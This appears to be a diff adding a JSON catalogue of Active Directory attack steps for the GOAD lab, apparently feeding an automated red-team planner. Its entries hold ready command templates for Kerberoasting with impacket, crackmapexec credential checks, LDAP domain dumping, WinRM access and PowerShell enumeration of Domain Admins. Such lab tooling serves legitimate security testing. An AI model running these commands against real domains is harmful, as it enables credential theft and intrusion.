@@ -1,0 +1,130 @@
+[
+  {
+    "uuid": "goad-cred-t1558003-0",
+    "name": "kerberoast_impacket",
+    "mitre_technique": "T1558.003",
+    "mitre_tactic": "TA0006",
+    "description": "Kerberoasting via impacket-GetUserSPNs: extract TGS tickets for offline cracking",
+    "source": "Atomic Red Team T1558.003 + GOAD lab",
+    "command_template": "impacket-GetUserSPNs -request -dc-ip {dc_ip} {domain}/{kerberoast_user}:{kerberoast_pass} -outputfile /tmp/kerberoast.txt 2>&1 && echo '---tickets---' && grep -c '$krb5tgs' /tmp/kerberoast.txt && head -5 /tmp/kerberoast.txt",
+    "preconditions": {
+      "executor": "bash",
+      "privilege": "user",
+      "required_services": ["kerberos", "ldap"],
+      "required_files": [],
+      "required_credentials": ["domain_user"],
+      "required_access": "network",
+      "additional": []
+    },
+    "effects": {
+      "grants_access": "kerberos_hashes",
+      "creates_artifact": "tgs_tickets"
+    },
+    "cost": 0.2,
+    "rules_of_engagement_required": false,
+    "enrichment_quality": "hand-verified",
+    "provenance": {"tool": "manual", "report": "goad-lab-v1", "confidence": 1.0}
+  },
+  {
+    "uuid": "goad-cred-t1078-0",
+    "name": "crackmapexec_smb_auth",
+    "mitre_technique": "T1078",
+    "mitre_tactic": "TA0001",
+    "description": "Validate cracked domain credentials against SMB using crackmapexec (confirms (Pwn3d!) for DA)",
+    "source": "GOAD lab",
+    "command_template": "crackmapexec smb {dc_ip} -u {kerberoast_user} -p {kerberoast_pass} -d {domain} 2>&1 || nxc smb {dc_ip} -u {kerberoast_user} -p {kerberoast_pass} -d {domain} 2>&1",
+    "preconditions": {
+      "executor": "bash",
+      "privilege": "user",
+      "required_services": ["smb"],
+      "required_files": [],
+      "required_credentials": ["domain_user"],
+      "required_access": "network",
+      "additional": []
+    },
+    "effects": {
+      "grants_access": "authenticated_smb"
+    },
+    "cost": 0.15,
+    "rules_of_engagement_required": false,
+    "enrichment_quality": "hand-verified",
+    "provenance": {"tool": "manual", "report": "goad-lab-v1", "confidence": 1.0}
+  },
+  {
+    "uuid": "goad-disco-t1087002-0",
+    "name": "ldapdomaindump_discovery",
+    "mitre_technique": "T1087.002",
+    "mitre_tactic": "TA0007",
+    "description": "LDAP domain dump: enumerate all users, groups, computers in the domain",
+    "source": "GOAD lab",
+    "command_template": "mkdir -p /tmp/ldap_dump && ldapdomaindump -u '{domain}\\{kerberoast_user}' -p '{kerberoast_pass}' ldap://{dc_ip} -o /tmp/ldap_dump --no-json --no-grep 2>&1 && echo '--- users ---' && wc -l /tmp/ldap_dump/domain_users.grep 2>/dev/null || echo 'ldapdomaindump not found; trying ldapsearch' && ldapsearch -x -H ldap://{dc_ip} -D '{kerberoast_user}@{domain}' -w '{kerberoast_pass}' -b 'DC=north,DC=sevenkingdoms,DC=local' '(objectClass=user)' sAMAccountName 2>&1 | grep sAMAccountName | head -20",
+    "preconditions": {
+      "executor": "bash",
+      "privilege": "user",
+      "required_services": ["ldap"],
+      "required_files": [],
+      "required_credentials": ["domain_user"],
+      "required_access": "network",
+      "additional": []
+    },
+    "effects": {
+      "grants_access": "domain_user_list",
+      "creates_artifact": "ldap_dump"
+    },
+    "cost": 0.1,
+    "rules_of_engagement_required": false,
+    "enrichment_quality": "hand-verified",
+    "provenance": {"tool": "manual", "report": "goad-lab-v1", "confidence": 1.0}
+  },
+  {
+    "uuid": "goad-latmov-t1021006-0",
+    "name": "winrm_lateral_move",
+    "mitre_technique": "T1021.006",
+    "mitre_tactic": "TA0008",
+    "description": "Lateral movement via WinRM: authenticate to Windows target and confirm access with whoami",
+    "source": "GOAD lab",
+    "command_template": "whoami /all",
+    "preconditions": {
+      "executor": "cmd",
+      "privilege": "user",
+      "required_services": ["winrm"],
+      "required_files": [],
+      "required_credentials": ["winrm_creds"],
+      "required_access": "network",
+      "additional": []
+    },
+    "effects": {
+      "grants_access": "winrm_session",
+      "lateral_target": "windows_host"
+    },
+    "cost": 0.2,
+    "rules_of_engagement_required": false,
+    "enrichment_quality": "hand-verified",
+    "provenance": {"tool": "manual", "report": "goad-lab-v1", "confidence": 1.0}
+  },
+  {
+    "uuid": "goad-exec-t1059001-0",
+    "name": "ps_domain_enum",
+    "mitre_technique": "T1059.001",
+    "mitre_tactic": "TA0002",
+    "description": "PowerShell via WinRM: enumerate domain users and privileged group members",
+    "source": "Atomic Red Team T1059.001 + GOAD lab",
+    "command_template": "Get-ADUser -Filter * | Select-Object Name, SamAccountName, Enabled | Format-Table -AutoSize; Write-Host '---Domain Admins---'; Get-ADGroupMember 'Domain Admins' | Select-Object Name, SamAccountName",
+    "preconditions": {
+      "executor": "powershell",
+      "privilege": "user",
+      "required_services": ["winrm", "ldap"],
+      "required_files": [],
+      "required_credentials": ["domain_user"],
+      "required_access": "network",
+      "additional": []
+    },
+    "effects": {
+      "grants_access": "domain_user_list"
+    },
+    "cost": 0.1,
+    "rules_of_engagement_required": false,
+    "enrichment_quality": "hand-verified",
+    "provenance": {"tool": "manual", "report": "goad-lab-v1", "confidence": 1.0}
+  }
+]
